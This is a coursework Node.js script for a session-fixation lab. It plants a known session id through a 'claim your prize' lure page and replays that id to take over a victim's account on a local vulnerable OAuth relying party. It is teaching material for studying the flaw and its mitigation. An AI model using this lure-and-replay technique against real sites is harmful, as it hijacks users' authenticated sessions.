// attacker-server.js
// ISEC3004 Assignment 1 - OAuth Session Fixation (ATTACKER SIDE)
//
// Run: node attacker-server.js   (attacker site on http://localhost:7050)
// Requires the vulnerable RP (node vulnerable-app.js) running on :7001 and
// the mock provider (node provider.js) on :7000. Requires Node 18+.
//
// What this does, in order:
//   1. Acts as the attacker's own browser: it visits the vulnerable RP once to
//      obtain a session id (sid=A) that the RP has stored.
//   2. Hosts a lure page (attacker-page.html) whose "claim your prize" link
//      sends the victim to  http://localhost:7001/login?sid=A  -- fixating the
//      victim's browser onto the attacker's known session id.
//   3. Exposes /takeover, which replays sid=A against the RP's /account page to
//      prove the attacker now shares the victim's authenticated session.

const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 7050;
// Target relying party. Defaults to the vulnerable RP; set RP to the mitigated
// RP to confirm the same attack fails:  RP=http://localhost:7002 node attacker-server.js
const RP = process.env.RP || 'http://localhost:7001';

let attackerSid = null;

// Pull a session id out of a Set-Cookie header value.
function extractSid(setCookie) {
  if (!setCookie) return null;
  const m = /sid=([a-f0-9]+)/i.exec(setCookie);
  return m ? m[1] : null;
}

// Step 1: obtain the attacker's own session id from the RP.
async function acquireSid() {
  const res = await fetch(`${RP}/`, { redirect: 'manual' });
  const setCookie = res.headers.get('set-cookie');
  attackerSid = extractSid(setCookie);
  console.log(`[attacker] acquired RP session id to fixate: sid=${attackerSid}`);
}

// Step 2: the lure page, with the fixation link injected.
app.get('/', (req, res) => {
  if (!attackerSid) return res.status(503).send('attacker not ready, retry in a second');
  const fixationLink = `${RP}/login?sid=${attackerSid}`;
  const html = fs
    .readFileSync(path.join(__dirname, 'attacker-page.html'), 'utf8')
    .replace('SET_BY_SERVER', fixationLink);
  res.send(html);
});

// Step 3: prove takeover -- replay the fixated sid against the victim's account.
app.get('/takeover', async (req, res) => {
  if (!attackerSid) return res.status(503).send('attacker not ready');
  const acc = await fetch(`${RP}/account`, { headers: { cookie: `sid=${attackerSid}` } });
  const body = await acc.text();
  console.log(`[attacker] /account via fixated sid=${attackerSid} -> HTTP ${acc.status}`);
  res.send(`
    <h2>Attacker view of /account (using fixated sid=${attackerSid})</h2>
    <p>RP responded with HTTP ${acc.status}:</p>
    <pre>${body.replace(/</g, '&lt;')}</pre>
  `);
});

app.listen(PORT, async () => {
  console.log(`Attacker site hosted at http://localhost:${PORT}`);
  try {
    await acquireSid();
    console.log(`[attacker] lure ready:   http://localhost:${PORT}/`);
    console.log(`[attacker] takeover test: http://localhost:${PORT}/takeover`);
  } catch (e) {
    console.error('[attacker] could not reach the RP -- is vulnerable-app.js running?', e.message);
  }
});
